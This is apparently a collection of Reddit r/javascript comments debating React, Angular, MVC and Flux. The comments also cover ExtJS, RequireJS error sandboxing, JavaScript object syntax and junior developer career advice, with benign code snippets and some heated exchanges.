This might just be me but then again my work is rewriting big apps from angular to react. Most big Angular apps look to be hacked together with a duct tape (models intertwined with views in so many ways that the app is impossible to understand). This is no fault of the MVC that just tends to happen given enough time and no rigid structure. The problem with MVC is that every new person, every back-end engineer can start writing "good" code that generates insane amount of technical debt. In a perfect world this could be avoided but alas, now I have work for the rest of my life. React on the other hand forces separation of code into components. Components can be read and understood without reading the rest of the program. Components can be deleted and rewritten again without any impact on other parts of the program. I can feel safe adding new functionality to a massive react program. And I feel like I am in a minefield when working with Angular(still miles better than the jquery spaghetti we used to write) MVC is not terrible as a concept, we, programmers, are terrible at executing MVC when the scope gets too big. And React solves this problem.
It allows you to view the structure and definition of the class much more easily- it's no different in that regard than ES6 classes. Allowing arbitrary code in between assignments to the prototype requires more mental overhead to piece everything together- it's basically a rephrasing of the first point.
"What's so great about React.js?" read the homepage.
D: But I'm already trying not to shake my fist at the misappropriation of isomorphism! 
`var log = console.bind(console)` /smartarse 
Thanks, sorry I only answer now, I'm am not yet adapted to reddit. Glad it was helpful to you, in the company I work for, we have about 120 repositories, some of them I never needed, as they are from other teams, so it ended up being very useful. Any pull request will be welcome!
React is already doing this, even with routes: https://github.com/rackt/react-router-mega-demo
A little bit off-topic, but does anyone have a link to more sophisticated example of flux/react, meaning data entry of more than one field per entity and ideally tree-like structure? All those examples showing something like &lt;input name="search-value" onChange={@onChange} /&gt; or in best case &lt;input type="text" valueLink={this.linkState('newDescriptionText')} /&gt; which is not clear how to use with flux or in case of `state.a.b.c` fields to bind
Facebook making it was actually a big turnoff for me orginally I'd say React is popular in spite of FB, not because of FB
Mvc is not terrible for big apps you have no idea what you're talking about. 
Well this is math we're talking about, and math terminology absolutely does *not* change. That's why it bothers me.
There's conferences and consulting.
Holy crap, that article you linked to has the coolest concept ever for showing examples + working demo.
&gt;HTML directly mixed in your JS mixes the presentation layer with your logic, breaking separation of concerns. React **IS** your view layer, so it should have deep knowledge of your HTML structure. &gt;.JSX files - It's built around the concept of compiling your JS files, which to me seems like a framework overstepping its bounds. Why? JSX is syntactic sugar. You don't have to use it, but you should, because there isn't any good reason not to. 
Check out this for more on why MVC isn't good for large, complex applications: https://facebook.github.io/flux/
For example, bootstrap was a word before computers. How do you reconcile that? i.e. it's not even pedantry.
sounds like a problem of Angular, not MVC? Also, I hate to be that guy, but angular is not based on a classical MVC pattern. I also have experience in working with large angular apps, and you're right - I find angular being quite problematic for larger codebases.
So, I've never written, really seen or read up on react.js, so I can't make many comments on that particular framework. But I do write AngularJS every single day, and I very much disagree with your assessment of MVC being bad for large scoped applications. As with any language or design pattern, you can royally screw yourself and your future development partners by being undisciplined. I think the valid criticism of AngularJS is that it doesn't force you to do anything, and as such you can very easily end up with a spaghetti of code. In one day, you can go from clean, simple and elegant to messy, ugly and complex. But, this has nothing to do with whether or not a clean MVC implementation in AngularJS isn't scalable, it has to do with how disciplined you (and your team) needs to be to implement a well built AngularJS app. From my perspective AngularJS is best used (even for large scope applications) with an MVC and services oriented architecture. If every major piece of functionality is wrapped in a service, and then each controller is simply connecting various services in a custom way, then your application becomes incredibly simple to understand for new developers. If you code logic into your HTML templates, then that's your fault as the developer for not following good coding practices. In reality, the cleanest controller would have some set of view states that define what's visible or not, and then your HTML contains a few ng-show="viewConfig.showChart1" elements, and boom, your code is fully understandable just by scanning the controller. This is fully done with strict MVC and a services based approach. In my opinion, it's the best way to use AngularJS. Couple that with well designed reusable directives and AngularJS is one of the most flexible frameworks available. Granted each directive in itself breaks MVC, but as a whole MVC is followed. As a side note in defense of MVC, it's one of the better ways to make apps scalable. In my experience most of the scalability issues come in parts. The data model isn't flexible enough for example. So do I need to re-write everything? Or just the model? What if my UI ends up having a million lines of scrolling because I didn't anticipate the size of my data set? Well, I need to implement a filter or paging, with MVC I know exactly where to go to make these changes and don't end up touching code I don't need to touch. Which leads to fewer bugs, higher maintainability and easier ramp up time for new devs. 
Most of the workers only make 1-2 concurrent calls out at a time, so the pipeline approach may be a bit much. I'll implement the worker model and tune the # workers from there. Thanks for the help =]
No, unfortunately. Our JS size is already out of control. Right now I'm trying to see if I can free up ~33kb by removing/refactoring so adding it would leave us at roughly the same page size.
Awesome idea man; would be awesome as a teaching tool for learning to code too.
I would get your resume together and start applying, and then when you get stumped in interviews use those questions to guide your research.
If you're already fucked with a massive payload (250kb, 1mb, 5mb, 10mb), then the 33kb is not going to be the problem. It's going to be a necessary penalty for you to do a clean migration. Now's really not the time to be so adamant about payload size. That ship has sailed. Get the migration done.
Generally I think this is a good idea, I don't believe its new but the approach and execution seem sound, so good on 'em. I'm not sure how this is very different from some other approaches vis-a-vis pre-loading the initial model/state and pushing that with the initial html fetch. in fact it seems like it may be a slight over-complication (with the server-side rendering of the app) from a setup point of view but not a programming point of view. 
I like react but build a fully feature complete extjs grid with it and then claim victory. React is just a rendering layer edit: a grid is not just a table like arrangement people. Go look it up!
Directives? They still fall short, IMHO. The two way binding capability of params makes debugging troublesome. Anyone can inject some random service and update something that shouldn't be done... Circular reference injections. Oh, you wanted that directive on that element? It's too bad the Dev decided to add a dependency on your session service and that depends on this other service that depends on ...ugh.
You're just moving the merge conflicts out of source control and into runtime, which is a much worse place to resolve them. I've now built big and small React apps myself, in a small startup and at a huge company. The only places they don't work out are where engineers are afraid to get the designers to change their process.
But something like Angular templates puts JavaScript like syntax in the HTML. (Loops, etc...). Actually, a lot of the various template engines seem to go out of their way to figure out how to write their own languages or dreadingly simplify JavaScript to the point where it's wholly unusable for anything but what the designers conceptualize you should be doing. You have a powerful scripting language and your are eschewing it for "Bob's Grand Script".
It fills the View and the Controller. In fact, it basically takes the standard V/C paradigms and makes the Dev create hundreds of little V/C combinations instead of trying to make large monolithic controllers to manage forms. In React you manage fields.
https://github.com/h5bp/Front-end-Developer-Interview-Questions
All of the ideas like this against react are the things people think 'in theory' but are usually not grounded in reality (i.e.in practice, actually building things). Consider this: you've chosen bootstrap as your css framework. You'll be using a lot of row and col classes so you make a column and row component. Hey look at that! I can swap out css frameworks completely and change the class names in __one__ place. That's such a good idea I may want to use it in tons of projects (someone's already got a mixin https://clozeit.wordpress.com/2014/01/08/13/). The issue of markup in code is similar. __Why__ are you so concerned? These are functions not actual markup, but there are some amazing benefits to being able to refer to components as markup in a language that has higher order functions...The entire point is they are functions and therefore we can take advantage of the composability a sort of functional language provides. JSX simply helps you model the system more easily, and that is a very good thing. Ultimately, if it increases productivity, composability, performance and maintainability (far simpler mental model) how is putting js in your markup ala Angular superior to putting 'markup' in your js? Finally, which one of these frameworks is used in one of the world's most widely used Web Apps vs (at best) small internal tools by their corporate stewards? (and xhp was the same concept in php and being used in prod by Facebook many years before the thought of react was even conceived). Thats real life proof it can be used in products with some of the highest demands that exist as far as scalability is concerned. When I think about doing my job (delivering scalable, quality software) that's not much that makes me think the term 'great' than that. In summation I just want to say: try it. It hurts nothing and it will give you a different way of viewing how you structure your apps which is always good. If you build something non trivial like a todo list and you find you hate it, you've lost very little, but you might be surprised to find you love it (I had the same markup reaction right when it came out but realized I didn't actually have an argument that fit react when I really dug into it. It was just an ingrained mental model that reacts goal is to change). 
I still don't understand the point. How is this different from using something like PHP to pre-render the HTML with everything (or most everything) the user needs in order to *not* see a blank page? If the server has the data at the time of the first request, why make the browser do another request in order to get it?
Maybe in 2009 there was a need for that, but now we have [flexbox](http://css-tricks.com/snippets/css/a-guide-to-flexbox/).
A Junior Front End Dev role would probably be the easiest to jump into. I'd recommend getting a resume together, building a portfolio of work and just start applying for now(no harm in testing the waters - you'll find out very quickly whether or not you're qualified). My main tip would be to just get good at the basics; HTML, CSS &amp; JS. Getting 'good' at JavaScript will be the hardest part but it'll also give you an advantage over those that just know HTML/CSS and basic jQuery. There are a lot of resources available on getting good at JavaScript, so I won't regurgitate them here. Try your hand at toy problems at codewars.com to test yourself - they're ranked in terms of difficulty, so start with the easy ones. Once you feel fairly comfortable with HTML/CSS/JS, try learn SASS and jQuery, as a lot of shops still use these quite extensively. Let me know if you have anything specific you'd like to know. 
As well as what others have said, have some stuff that potential employers can look at. Whether its your portfolio site, some open source project, a JS Canvas game or whatever. This will let them see what you are capable of and that you have a passion to make things in your personal time. There's plenty of open source projects out there at various levels you can look at, plus if its on GitHub or whatever you will pick up version control/git which is a valuable skill to have!
I don't know, that just doesn't match my experience. I've explicitly had our developers NOT create custom components or ever modify core ExtJS code, it's almost all stock, and we don't have these issues... in fact, until the middle of last year our corporate standard browser was -gasp- IE6... and even with it, our performance has rarely been an issue (only times I can think of where it has been is when we tried to dump 1000+ records into a grid... but that's a usability issue regardless of ExtJS performance). Eh, whatever, we're probably boring the React folks at this point :)
My experience is with v4. Classes like the grid break proper separation of concerns by interacting directly with Stores straight out of the box, behavior that is better encapsulated in some type of controller layer. An example of fragile inheritance is something like the TreeGrid where the view is like 5 levels of inherited classes, hope you don't want to change a behavior that's 3 levels deep and all the layers on top depend on. Performance may be ok for internal webapps, but it is certainly not up to consumer standards. For example scrolling with buffered renderer and variable row height remeasures every row, causing an Ext layout for every scroll event and a browser reflow for every single rendered row. Take a look at the grid that was announced at React conf. Doing something like that in Ext and making it performant would be just about impossible. I'm glad it works for you, but it's been my experience that Ext is extremely costly to optimize and customize, where as React takes some initial investment since it has no "out of the box" functionality, but optimization and customization is dirt cheap, because it's very simple. React's learning curve is vastly shallower and much easier to get a large dev organization up to speed. The api surface area of Ext and the knowledge required to optimize it (like debugging layout cycles) is enormous, and getting a 100+ person dev organization trained and on the same page is a very daunting task. 
The issue with 'classical' mvc which unless you are writing old small talk apps, means model 2 over http these days., is that it's an adaptation of the original mvc built around a stateless protocol. The client isn't stateless and most of the complexity revolves around state. This is why we have all these weird quasi mvc patterns trying to be shoe horned in to a paradigm they never fit well with to begin with. Managing statement in an extremely simple and straightforward way is the intention of react, however. 
Because the server doesn't know the app needs data until all templates and JavaScript are loaded, since it's the JavaScript that's making the request and filling the templates. 
&gt; so I was surprised that the Backbone one didn't require twice as much code or anything Not until you start dealing with something more complex. Subviews and dynamic interfaces (which require cleanup) are main offenders. For any simple stuff Backbone is beautifully simple, elegant, productive. But once you've dealt with all that in Backbone, React looks like a breath of fresh air (nested views are seamless and cleanup is entirely unnecessary). As for clean code, it's subjective of course, but I remember making comparison of Backbone (+handlebars for templating) and React a while ago (using that same React's todo demo) and they looked very similar — https://gist.github.com/kangax/ae6f670426551def6f25 However, Backbone's declarative event handlers + Handlebar's declarative templates look easier on my eye (especially when comparing to JSX-less version of React)! I almost wish I could have Backbone's declarative syntax but with all the power/convenience of React's subviews and virtual DOM :)
Two way data binding MVC in the Rails N-tier stack can be meh. Real MVC from the Smalltalk days is what Flux re-invented, and the single flow of state mutation is a big win. https://medium.com/@davidsouther/song-flux-e1f9786579f6
if its not in es6 or es7 it ain't javascript. its some weird abstraction layer of which i care nothing about. Google has an agenda. They can stomach a 10 year game plan before they realize their plan. It just feels like we're drinking the Google koolaid with polymer, material design, and now angular 2.
 var log = console.bind(console); $.getJSON(url, log.log); Its much better to wrap your logger anyway, so you can change it later.
Senior dev (freelance) here in Pittsburgh. Do you come to the meetups? Come to any or all of http://www.meetup.com/Angular-js-Pittsburgh/ http://www.meetup.com/Pittsburgh-Code-Supply/ http://www.meetup.com/Pittsburgh-JavaScript/ PM me and we'll find one to meet at.
You can program. It is a learned skill - there is no shortcut. Find an example. Codewars is good. Work on it. Read code. You will not understand what it does. That's ok - you'll figure out some of it. Write more code. Read more blogs. Keep at it.
React is one of those things that looks like a terrible idea until you try it, and then you realize it's amazing. I had the same opinion but then I tried it. 
It'd be mostly the same as how you'd do it with state, except instead of calling setState you're using an action creator and creating an update action. If you have a nested object you could either have individual actions for every little bit of the form, or just have one big update form action that takes the modified form object.
So is it a styling problem, or a click handling problem? In your example virtually everything seems to be assigned at element style (style attribute). Do those gg classes exist in some not included css file? I'm not sure how style inheritance could be a problem. 
I don't know what you're using to generate this code, it follows that the issue is there since all of the styling looks to be applied explicitly and on the elements themselves. Consult documentation?
I'm using Object2VR. I've contacted the developers and am waiting to hear back. It's just one or two people and I know they're both sleeping so I figured that I would try a couple other forums.
It does make sense, you just need to zoom out a little bit. A conflict means you need to reconcile two sets of changes to make a correct program. This can happen in git (i.e. you and I edited the same line of code) or it can happen at runtime (i.e. you changed the contract of a module I use and now my code is broken). One is alerted at merge time, the other is a runtime bug. For example, if you're doing classic jQuery + templates, a designer could change the class name of some element and break your JS. Even though they're in separate files, they're still intertwined together and I'd argue that this is just as much of a merge conflict as one highlighted by git. By colocating related code together, you decrease coupling and increase cohesion (you don't have two modules implicitly tied together and the combined file still only does one thing). These are generally good things. An example of "needless complication" isn't "the code doesn't look the way I'm used to it looking", it's "changes in module X affect changes in module Y and I don't know why". Modern web dev's version of separation of concerns encourages these types of architectures for no reason other than "it's the way it's supposed to be done". I actually think calling this "modern web dev" it is incorrect since it's clear that eschewing templates in favor of components has become accepted best practice in many circles (and growing). We are redefining "separation of concerns" as "modern" frontend devs use it because it's been used incorrectly for 10+ years.
React is everything that was ever wrong with PHP shuffled off to the browser. 
&gt; 1. HTML directly mixed in your JS mixes the presentation layer with your logic, breaking separation of concerns. This is the biggest misconception among people reading about react. You don't have to store logic in your components. In fact, it is not even recommended. Only pieces JS code that goes into your components are, triggers and UI behaviour. For example, if my component is a button, I should write the code to change it's appearance in the controller, not to submit an ajax request. I can tell some other part of the application to do that for me (Actions) and then do data manipulations in yet another part (Stores). React (+ Flux) actually does a great job at separating concerns. Read about flux. If you want to try it, give reflux.js a shot. It is a slightly impure but simpler version of the flux architecture. Example: Lets say you have a "like" button. When clicked, it send a POST request to the server to record a like and it also changes it appearance. A very basic (perhaps non-working) example would look something like this, var Like = React.createClass({ like: function(){ this.setState({liked: true}); Actions.like(); }, unlike: function(){ this.setState({liked: false}); Actions.unlike() }, render: function(){ if (this.state.liked) { return &lt;button onClick={this.unlike}&gt;Unlike&lt;/button&gt; } else { return &lt;button onClick={this.like}&gt;Like&lt;/button&gt; } } }); This component only declares what the UI should look like and hands off the "logic" part to Actions. A real world like button would look much different. You'd probably use state to update in real time but overwrite it with props, or you would split the action into 2 (requestLike/Unlike and Like/Unline) and only use props to store status of the button. Also there would be IDs involved, etc, etc. If you are inclined enough, your logic doesn't even have to be a reactjs thing. It can be plain old JS functions, backbone collections/models/controllers or whatever. In my opinion React actually properly separates the concerns. Actions -&gt; Logic, Network stuff, etc. Stores -&gt; Your data and operations you want to perform on it. Components -&gt; Just the UI. I've left out a big part of the flux philosophy, the one-directional data flow. This makes the whole thing work so beautifully and tames even the most complex beasts of interfaces. Read about it.
It will never happen.You can't retrofit types and expect it to be compatible with old js. If you want types use typescript, or others that's the best you'll ever get. &gt;&gt; If typed JavaScript is just a matter of time, nobody working at tc39 ever said that. Brendan Eich said he keeps an open mind but that's politics. ES4 had types,we all know what happened to ES4.
Wha-what? Can you elaborate on this?
That's a really solid argument I hadn't considered. The illusion of separation indeed.
I would put the values into their own elements, so you'd be able to create a fallback that will at least convey the basic information even without JS.
That's how they chose to sell it (can't fight all battles at once), but you will find that top-level views often fill the role of Controllers. And you don't need Models because you have JS objects and arrays.
I don't really agree. For example: &gt; "isometric" comes from the Greek for "equal measure" [source](http://en.wikipedia.org/wiki/Isometric_projection) And &gt; isomorphism (from the Greek: ἴσος isos "equal", and μορφή morphe "shape") Means that the code has equal shape (code) between client and server side, or more exactly environment agnostic. 
I can't see any &gt;has the coolest concept ever for showing examples + working demo. here http://jlongster.com/Removing-User-Interface-Complexity,-or-Why-React-is-Awesome Where exactly should I look at?
Your buggy scroll-jacking is fucking annoying. Leave my scrollbar alone...
We have a modularized application structure with a sandbox mechanism preventing modules from crashing the whole app when an error occurs. Runtime exceptions (such as calling a methond on `undefined`) are catched by the sandbox and printed to the console. Things like timed-out REST calls or invalid data are visible to the user in the interface (except for some special cases). In general, technical stuff is never visible to the user, so we would never use something like `alert()` for that.
&gt; We have a modularized application structure with a sandbox mechanism preventing modules from crashing the whole app when an error occurs. Can you be more technical or share some code on how you do this?
I had js disabled, sorry about it (:
and for any UK-based JS Redditors, here's a link to the monthly London Ajax User Group meetup (where this was recorded): https://skillsmatter.com/groups/54-laug
Due to an NDA I am not allowed to post concrete code here, but I can give you a few general things: - we use Backbone and Marionette with some of our frameworks on top - modules are stored in separate folders structured always the same way (e.g. `modules/UserManagement/Controller`) and work independently in the scope they get. Thus, they can be replaced or relocated within the application So, how is the sandboxing stuff achieved? Here is an approach one could use to sandbox modules: loadModules: function(modules) { // error checks _.each(modules, this._performLoad), this); // other stuff }, // .... _performLoad: function(module) { // error checks var path = this.pathConfigurator.resolve(module); var errorHandler = this._moduleLoadingError(module); require([path], function(){ try { // Instantiate the module and start it } catch(exception) { errorHandler(exception); } }, errorHandler ); } It basically handles require.js error and catches everything that bubbles up.
Give this guy some credit!! He is posting at /r/javascript with JavaScript disabled!! :P *@munrobag please don't take offense - I just thought it was hilarious*
Is this a troll post (as the name insists?) &gt; stupid mixins (largely removed in 0.13) Mixins are a huge win for React and not having them in 0.13 is holding me at 0.12 until they figure it out or revert...
I'd even argue that merge conflicts would be rare since you are working with such a small part of the page. In traditional template + code configuration you have a bigger chance that two (or more) people would be working on the same template at the same time.
I also add enforceDefine to my configurations and add a an error handler on requirejs.onError. RequireJS errors can be hard to track down I've found these 2 settings to help a lot!
Interesting question. I think I might write a better answer into an article sometime in the future, but here's a quick one off the top of my head for now: I think in general you should know the possible failure points and try to anticipate them - any points with user input, any points with string parsing (eg. JSON), any points with Ajax, WebSockets or such. You can try to pre-emptively wrap such cases in try-catch blocks, and validate returned values from function calls. This should allow you to gracefully handle most problems, and display useful information to the user ("X failed, retry yes/no"). Then, you have asynchronous code. Ajax handlers, timeouts, intervals and such. A try-catch block from the caller will not work on these, so you need to pay attention and make sure you have proper handling inside their callbacks. Finally, you can attempt to catch errors in the global window.onerror handler. When an error gets to this point, you probably won't be able to do much to handle it gracefully, but you should log it (for example there are 3rd party error logging services) so you can keep track of potential bugs and cases where you need better handling in application code. Something I find helpful is to make sure my unit tests cover failures. It's often easy to forget about it and only test the success routes.
I'm more annoyed by the popup three seconds into reading that covers the text asking you to register, but the non-smooth scrolling they implemented is also rather annoying.
Came here to say this.
:) I know "what design patterns actually mean". This work based of [gof design patterns](http://www.dofactory.com/javascript/design-patterns). Yes, I strongly agree with you. "Be able to do something doesn't mean you have to use them for everything." Purpose of this project is to show others what is new. Also for "execute" look at [this](http://www.dofactory.com/net/command-design-pattern). Anyway, thanks for your time and comment.
Feel free to copy it into every project if you'd like. Modulizing it adds practically no real overhead and provides huge standardization gains. Have you looked at gulp's source?
Reverting to default values through the prototype using "delete" is new to me. Looks like it works with functions too. Thanks!
This sounds cool. Maybe try cross posting it to r/programming for exposure? Tough time frame for me though, I'll do my best to watch cause jit stuff is interesting to me
Yes, I just live in my ivory tower throwing documents at ~~typists~~ developers. :)
Basically, the first thing OP complained about is first thing people who grew out of being a junior developer complained about with PHP. 
Sorry! Been out of pocket. "// Javascript uses '=' to assign a value to a variable // and ':' to assign a value to a key inside an object." So it seems that setting: var foo.bar = "blah"; and setting: var foo = { bar: "blah"; } are functionally equivalent? Or is there a subtle difference I'm missing here?
It must be wonderful to be 12 years old, and have been born with an innate ability to instantly absorb every minuscule detail about a new language immediately. Your life must truly be a blessed one. Let's play your game: "You're fucking horrible at interacting with people online. Were you to rage like this to someone in public, you would summarily have your ass beaten to a pulp, which is precisely why you cower behind your keyboard and talk shit. You need to grow up, put on your big boy pants, and learn when to simply shut the fuck up when you have nothing constructive to add to the conversation.
Believe me, I love it when you "pop up!" I learn something new every time! Unfortunately, I'm not sure what I was doing there either. :P I need to go back and scrub the code again. 
Use the AJAX code in my example. This is very important to add to the property list: { processData: false } 
Note that manipulating an object with delete can cause performance issues in most modern js engines. If this is just your own code for a simple website then it's nothing to worry about, but if you are writing a library or making something that needs high performance, then I would double check things using the performance panel in your favorite browsers Dev-Tools. 
I think its pretty easy to get excited about. Rather than making the next step in MVC, like alternatives, react rethought the approach. That in itself is exciting.
Yes they are functionality equivalent. The syntax is a bit wonky still but the first would be dynamically setting a key 'bar' on the object 'foo' whereas the second would be creating an object 'foo' with the key 'bar' already set. Just like in some other languages, the dot signifies you want to do something on that object. Either run a function or set/get a value. If you try to run that first statement then 'foo' hasn't been set to anything and you would get an error by trying to access the property 'bar' on a non-existent object. This is how you would do that. var foo = {}; // Declare 'foo' and set to an empty object foo.bar = "blah"; // Set the property 'bar' on 'foo' to "blah" If foo was already declared and set to an object elsewhere and you just want to add a new property 'bar' to it then drop the 'var' from your original version (since the object you are working on is foo which has already been declared) and that's what it'll do. I think you are still a bit confused on how objects are used in javascript so here's a brief overview and hopefully it'll make things a bit more clear. var obj = { key1: "value1", key2: function () {}, key3: {}, "key with spaces": 0 }; So that object has 4 properties on it which can be accessed these 2 ways. obj.key1 == obj["key1"] == "value1"; // either method gives the same value, just If the key you are trying to use has spaces or special characters which would make it invalid using the dot notation, you can access it like a map (because it is one). When you are separating, key/value pairs you want to use a comma instead of a semicolan because it isn't a line ending. The semicolan thing just takes a bit to get used to where it wants them but generally speaking it follows C based languages on that. var foo = { bar: "blah" // no comma bc there isn't another key coming //and no semicolan because it's not the end of the declaration statement };
But what if you work on it with a lot of people and have a big project? Separating the project in various files seems like a good thing then?
Fantastic! I am in!
Well I would say that D3 isnt a complete charting library, but provides you with the tools to create such a library. I mean I know of other chart libraries that use D3 underneath, so you dont have to write your own. With something like this, its all done for you in a neat little package. 
Getting this: &gt;This site or app is sending too much traffic to rawgit.com. Please contact its owner and ask them to use cdn.rawgit.com instead, which has no traffic limit.
Where is this code executing? Is it embedded in an HTML document? What browser are you in?
You are moving all the circles $(".circle") select all the circles you already created by $(".lower").append("&lt;div class='circle'&gt;"); Try calling it like this to only affect the one being created at the moment. $(".lower").append("&lt;div class='circle'&gt;").css("top", circle_top).css("left", circle_left);
or maybe var circle = $("&lt;div class='circle'&gt;").css("top", circle_top).css("left", circle_left); $(".lower").append(circle); I am not sure if $(".lower").append("&lt;div class='circle'&gt;") returns the .lower or the new .circle.
Apparently you don't understand `The Node Way`.
I don't think you actually read what I wrote, but ok. My unsolicited advice is to keep an open mind because the world is changing. 
I did read what you wrote, and it's full of shit. You see things the way you want to, if only to justify your choice of framework. It's quite obvious if you "zoom out a little bit" that you aren't making much sense. 
After you see what crypto wall does you will do it too (nobody said that crypto can enter with js, but I don't really trust them!) . I just disables js by default and enable only when I really need it and on sites I almost trust.
It doesn't contain "React" so nobody is likely to read about it.
I have been using this lib: https://github.com/zeusdeux/isInViewport
Looks good as well. The other link is a DIY pure JS implementation, though.. Helped me understand! 
I just don't use it. Perhaps I could benefit from it, but I've never tried.
#11: scroll jacking
Great explanation, thanks!
This looks interesting, but it sounds like it can't be easily incorporated into a gulp flow without some additional work? &gt;pull-streams are not directly compatible with node streams, but pull-streams can be converted into node streams with pull-stream-to-stream and node streams can be converted into pull-stream using stream-to-pull-stream What is the advantage to using them?
Blatant ripoff of https://github.com/arasatasaygin/is.js
Why are you getting so defensive over this?
Wow, as if JS wasn't pervasive already, it now has a way to fight back the only force looking to displace it. Any company building API backed web apps will be all over this.
From another perspective. It's all components, so designers have to add classes in fewer places, are forced to use best practices rather than just creating a new button and class set because the padding is slightly different on the new one (a major problem with designers for the very reasons you mentioned). With react className and style are just props so your designer can style &lt;YourComponent /&gt; just like a div if you keep this in mind. More importantly, before this we had templates languages on the server designers had to style or client templates they had to style. What are these designers going to do about Web components if this is such a problem??? This whole idea that designers only styling html is a factor is pretty far fetched. Finally, in my experience it's all a falacy anyway. You get designers who can code somewhat, or designers that can only make pictures in photoshop. If there are really designers out there that can only style html and aren't able to open a js file and find the tags we've got far bigger issues. 
Oh you mean small teams like those working on Facebook products and instagram :p consider that maybe your designers and processes are the issue. 
I'd love to read more about how to get react-native coding an handwritten native code working together.
Maybe this is a new form of passive-aggressive SEO tactic. Now we have to google the damn thing.
i'm not spamming, granpa
&gt; You don't generate HTML with PHP and then monkey patch (or how you call "improve") the html with jQuery. That is bad architecture. No, that is not bad architecture, its called a basic Client-Server model which is how the web has worked for almost 20 years. Just because its not hip doesn't change the fact that its really still the standard way to server up a webpage. Your example does nothing to prove that JS on the server side is any better than PHP either. Everything you describe could be done in PHP (or any other server side scripting language) and pre-rendered into the page. Memcached is also quite commonly used to cache output generated by the server. Additionally, using memcached also lets you separate the caching server from the application server so you can scale each up independently as needed which can save time, money, and complexity. Seriously tho, your example reads like a perfect example of over engineering something. It may be easier for *you*, but most devs are going to look at that and say 'WTF are you doing????'
https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=define%20spam
Will do! Thanks for the heads up :)
Nice article. Thanks for sharing
I'm not defensive, why are you defensive? I call bullshit out when I see it, and React seems to be full of it. It's just more of the same kool-aid drinking bullshit the industry keeps chugging because noobs seem to rule the world. Jumping on bandwagons is bad for you, and the rest of the industry.
I've very excited to get my hands on this.
Looks like you have to buy a commercial licence to use it for commercial purposes.
It's not the same kool-aid drinking bullshit. It's a fundamental rethinking of how UIs should be built in the browser (i.e. thinking of the render target as stateless rather than stateful) and diverges from the mainstream thinking of many UI toolkits as well. I don't think the engineering team at Facebook (that I was a part of) is a bunch of noobs, nor does it have the luxury to build something like React without a good reason.
I love how all of the React posts are just "You should use this because it has bigword, reallybigword, seeminglyinventedword and promote somemadeupconcepttodescribereactjs. If you don't use it, you are an idiot." That said, it seems cool
React gets a bad rap for this but every framework mixes presentation and logic in one way or another. In Angular, Backbone and Ember, you're generally pulling in a template that lives elsewhere even though there is a 1-1 relationship between views and templates (I'd call this indirection). And inside the templates, there are loops, type checks, etc. - ie. code! People seem to be so set on there being a hard difference between "presentation" and "logic" but *every* app contains at least some *presentational logic* (eg. if x == y display it this way, else display it another way).
- Title meant to instigate a reaction - Absolutely no content Why the hell is crap like this posted on here?!?
It's quite obvious to me, both from what he's written and from the point distribution, that floydophone is in fact making quite a lot of sense. The point is, if your designers are modifying templates and you're simultaneously modifying code, you *need* to know about what their changes are so that they work with your logic. You can either find out about their changes through git conflicts, or by pulling the new code and seeing if anything breaks. The former is a lot more explicit and will force you to go through the changesets to make sure they're entirely compatible. The latter can lead to subtle regression bugs popping up, when their new code "appears" to work but in fact changed something small that your logic relied on.
The problem with this thread is your assumption that floydophone's motivation for picking React is the hype. Assumptions like this will make you shortsighted to new technologies. You don't have to like React, but you shouldn't just write it off based on your first impression. Don't you think that it's *possible* he did the research, made an informed decision, and just *disagrees* with you?
&gt; The same could be said to you. How?! gaearon is an experienced dev who *has* tried many frameworks and uses React because he's found it works better than what he's used before (I know this because I've seen his posts and his code before). Why are you assuming it's his first time around the block?
JavaScript consoles tend to print the result of the last expression. `console.log` prints the arguments to the console and returns void/undefined. If you do: //nameString("Michael"); console.log(nameString("Michael"); console.log will write to the console and return void, so nothing further to print to the console. If you do: nameString("Michael"); //console.log(nameString("Michael"); then the last expression returns your string, which is printed to the console. Try switching the order: console.log(nameString("Michael"); nameString("Michael"); You should see your string twice. 
Exactly. If you did this: nameString("Michael"); console.log(nameString("Michael")); 3 + 3; You'd see `6` as the last line in the console.
Maybe this is a stupid question, but: If a user interaction changes a model and i have a mechanism to listen to those changes in order to update the components in the view, where each view does not just re-render it's template, but updates very TARGETED only that part of it's template already in the DOM, that needs changes... ... and i use "requestAnimationFrame" + intelligent batching of read's and write's (by using something like https://github.com/wilsonpage/fastdom) wouldnt that be faster? (because i do not need to compute a diff)
This was good, any other articles like it out there that you know of?
Because "developers who write tech posts are 'networking' and more 'employable'" - so everyone just starts writing crap about the latest flavor of the month and we end up with a bunch of meaningless noise with people trying to drive traffic to their crappy blog posts.
Implement your page as a series of components. Each component has a file for its class.
It doesn't matter how 'clear' your selectors are, you're still introducing coupling. And because you've "separated your concerns", that coupling is now invisible and impossible to reason about without looking at multiple files in advance or doing a build and seeing if anything breaks. Invisible, tight coupling. This is not an advance. Too many times have I had to deal with a project full of obscure empty divs, waiting to be used by some random script, possibly ported in from common code rather than the project itself, in some impossible-to-fathom manner. Anyone who tells you this achieves 'separation of concerns' and 'convenience of development' is wrong. Dead wrong.
There are also many great devs who have tried React anyway, and found this to be a surprisingly superficial complaint. Many people have found, empirically, that for their project, the benefits of React outweigh the negatives. I am one of them. I'm not asking you to become one of them. Of course everyone will have their favorite frameworks. I'm just asking you to not write all of them off as a bunch of hype-chasing noobs. Some of them have made an *informed decision* to use React. I'm telling you this because important new technologies often seem most idiotic to experts who become unconsciously entrenched in their favorite ways of doing things and the dogma they've picked up over the years. I'm not saying React is one, necessarily, but it could be, and as web developers we have to keep an open mind to these things. The reaction of "I think this is stupid and therefore I won't pay attention to it even if lots of people talk about it" will bite you in the end, even if not with React. I'm also telling you this because six months ago I would have mostly agreed with you, and after 3 React projects I've completely changed my mind.
Yes, you are correct, I did notice this after posting. I believe the value can be calculated outside of the anonymous function and within the `squaredDeviations` function and access it (closure) without breaking the functional rules: var squaredDeviations = function(xs) { var m = mean(xs); return map(function(x) { return square(x - m); }, xs); }; What do you think?
The curry function in the post uses bind. 
Stop trying to put Java in the browser already.
Sorry, I have just seen your JSPerf, we are in agreement. 
Its great that className and style are just props. I see no reason why I can then not define all style, etc related values in JSON files and then inject them. The name I call this type of JSON file is a decor (decoration). If a different decor is activated it just has its values applied. Simple and designers can work with React components and decors no problem. I was eased into the React mix of JS and CSS with a fine API called AbsurdJS. Coming into HTML5 from Java I really did not appreciate having three separate files for one component. Its much better having it all brought together IMHO. Also, really like what David Nolen said in his Refracting React session, which was the idea of having one app state. The only thing I would do different is use Firebase refs instead of his cursors. Its all still immutable data we are talking about and Firebase path refs are cursors to me.
Somehow, from this response, I think I like you. 
What's your output?
